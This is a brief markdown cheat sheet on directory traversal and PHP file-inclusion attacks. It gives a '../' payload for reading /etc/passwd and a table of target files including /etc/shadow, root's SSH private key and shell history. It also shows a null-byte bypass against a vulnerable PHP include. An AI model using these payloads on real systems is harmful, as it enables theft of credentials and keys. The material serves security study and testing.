# Directory Traversal
Directory traversal attacks can occur due to improper sanitization of paths. An attacker can access a file elsewhere on the system.
```sh
../../../../../../etc/passwd
```

## Files of Interest
| Location | Description |
| -------- | ----------- |
| `/etc/issue` | Messages or system id printed before login prompt |
| `/etc/profile` | System wide variables (export, umask, terminal types, mail messages |
| `/proc/version` | Kernel version |
| `/etc/passwd` | Users |
| `/etc/shadow` | Password hashes |
| `/root/.bash_history` | History of commands |
| `/var/log/dmessage` | System messages and startup logs |
| `/var/mail/root` | Root mail messages |
| `/root/.ssh/id_rsa` | Private ssh keys |
| `/var/log/apache2/access.log` | Apache request log |

## Null Bytes
If the inclusion specifies the file extension, we won't be able use the `../../../` attack as it will default to the php extension. 
```php
<?php
include("languages/$file.php");
```

A null byte can be used to terminate the path and confuse the webserver. 

Note: Null bytes will not work in PHP 5.3.4 and above.
```php
include("languages/../../../../etc/passwd%00.php").
```
